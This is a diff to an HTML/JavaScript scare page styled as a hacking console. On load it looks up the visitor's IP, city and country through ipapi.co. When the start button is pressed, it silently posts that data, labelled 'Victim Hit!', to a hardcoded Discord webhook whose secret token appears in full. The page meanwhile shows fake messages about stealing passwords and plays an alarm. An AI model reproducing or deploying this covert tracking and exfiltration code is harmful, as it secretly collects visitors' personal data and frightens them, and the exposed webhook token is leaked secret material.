@@ -7,59 +7,16 @@
     <style>
         body, html { background-color: black; margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; -webkit-touch-callout: none; -webkit-user-select: none; user-select: none; }
         #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
-        
-        #console { 
-            position: relative; z-index: 2; 
-            width: 90%; max-width: 600px; 
-            border: 2px solid #00FF41; padding: 25px; 
-            background: rgba(0, 10, 0, 0.98); 
-            box-shadow: 0 0 20px #00FF41; color: #00FF41; 
-            display: none; box-sizing: border-box;
-        }
-
-        #start-btn { 
-            position: relative; z-index: 3; 
-            padding: 30px 20px; width: 80%;
-            background: black; color: #00FF41; 
-            border: 2px solid #00FF41; 
-            cursor: pointer; font-size: 1.2rem; 
-            font-weight: bold; text-transform: uppercase;
-        }
-
+        #console { position: relative; z-index: 2; width: 90%; max-width: 600px; border: 2px solid #00FF41; padding: 25px; background: rgba(0, 10, 0, 0.98); box-shadow: 0 0 20px #00FF41; color: #00FF41; display: none; box-sizing: border-box; }
+        #start-btn { position: relative; z-index: 3; padding: 30px 20px; width: 80%; background: black; color: #00FF41; border: 2px solid #00FF41; cursor: pointer; font-size: 1.2rem; font-weight: bold; text-transform: uppercase; }
         h1 { font-size: 1.5rem; margin: 0 0 10px 0; color: #ff0000; }
         p { font-size: 0.9rem; margin: 8px 0; }
         
-        /* 🛠️ FIXED PROGRESS BAR 🛠️ */
-        #progress-container { 
-            width: 100%; border: 1px solid #00FF41; height: 40px; 
-            margin-top: 20px; position: relative; overflow: hidden; 
-            background: black;
-        }
-        
-        #progress-bar { 
-            width: 0%; height: 100%; background-color: #00FF41; 
-            position: absolute; left: 0; top: 0; z-index: 4;
-            overflow: hidden; 
-        }
-
-        .percent-text { 
-            position: absolute; 
-            width: 100%; 
-            left: 0; top: 10px; 
-            text-align: center; 
-            font-weight: bold; 
-            font-size: 1.2rem;
-            white-space: nowrap;
-        }
-
+        #progress-container { width: 100%; border: 1px solid #00FF41; height: 40px; margin-top: 20px; position: relative; overflow: hidden; background: black; }
+        #progress-bar { width: 0%; height: 100%; background-color: #00FF41; position: absolute; left: 0; top: 0; z-index: 4; overflow: hidden; }
+        .percent-text { position: absolute; width: 100%; left: 0; top: 10px; text-align: center; font-weight: bold; font-size: 1.2rem; white-space: nowrap; }
         #percent-text-base { color: #00FF41; z-index: 3; }
-        #percent-text-overlay { 
-            color: black; z-index: 5; 
-            width: 100%; /* Important: Force it to stay relative to container */
-            position: fixed; /* Keep it locked to the console window */
-            left: 50%; transform: translateX(-50%);
-            max-width: 600px;
-        }
+        #percent-text-overlay { color: black; z-index: 5; width: 100%; position: absolute; }
 
         @keyframes emergency { 0% { background-color: #000; } 50% { background-color: #ff0000; } 100% { background-color: #000; } }
         @keyframes subtle-glitch { 0% { transform: translate(0, 0); } 50% { transform: translate(1px, 1px); } 100% { transform: translate(0, 0); } }
@@ -85,15 +42,13 @@
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1487870677636612197/G4uFH8d-UVi14OSGeAjy198ahM_va3PC32KjFV9l4aRV3rphNPRYR71l3Tr_3FAFhYBr"; 
 
         let audioCtx = null, alarmInterval = null, currentPercent = 0, matrixColor = "#00FF41";
-        let userLocation = "GLOBAL_TARGET", userBattery = "Detecting...", alarmTriggered = false;
+        let userLocation = "GLOBAL_TARGET", userIP = "DETERRING...", alarmTriggered = false;
 
+        // FETCH REAL IP, CITY, AND COUNTRY
         fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
             userLocation = `${data.city.toUpperCase()}, ${data.country_name.toUpperCase()}`;
-        }).catch(() => { userLocation = "REMOTE_TARGET"; });
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(batt => { userBattery = Math.floor(batt.level * 100) + "%"; });
-        }
+            userIP = data.ip;
+        }).catch(() => { userLocation = "REMOTE_TARGET"; userIP = "192.168.1.1"; });
 
         function startAlarm() {
             if (alarmTriggered) return;
@@ -136,11 +91,9 @@
                 if (!startTime) startTime = currentTime;
                 let progress = Math.min((currentTime - startTime) / duration, 1);
                 currentPercent = Math.floor(start + (target - start) * progress);
-                
                 document.getElementById('progress-bar').style.width = currentPercent + '%';
                 document.getElementById('percent-text-base').innerHTML = currentPercent + '%';
                 document.getElementById('percent-text-overlay').innerHTML = currentPercent + '%';
-
                 if (currentPercent >= 38) { startAlarm(); }
                 if (progress < 1) requestAnimationFrame(animate);
             }
@@ -150,7 +103,7 @@
         function runBreach() {
             fetch(DISCORD_WEBHOOK, {
                 method: "POST", headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ content: `🚨 **Mody12_S Alert:** Target in **${userLocation}** (${userBattery}) is being hit! 💀` })
+                body: JSON.stringify({ content: `🚨 **Mody12_S ALERT:** Victim Hit! \n**IP:** ${userIP}\n**Location:** ${userLocation} 💀` })
             });
             document.getElementById('start-btn').style.display = 'none';
             document.getElementById('console').style.display = 'block';
@@ -161,7 +114,7 @@
             const logLines = [
                 "Detecting hardware ID...",
                 `REGION_LOCK: ${userLocation} DETECTED...`,
-                `POWER_SOURCE: ${userBattery} BATTERY DETECTED...`,
+                `IP_ADDRESS: ${userIP} DETECTED...`, // NEW IP LINE
                 "stealing data informations...",
                 "accessing your whole device and passwords...",
                 "CRITICAL: SECURITY TRACE DETECTED!",
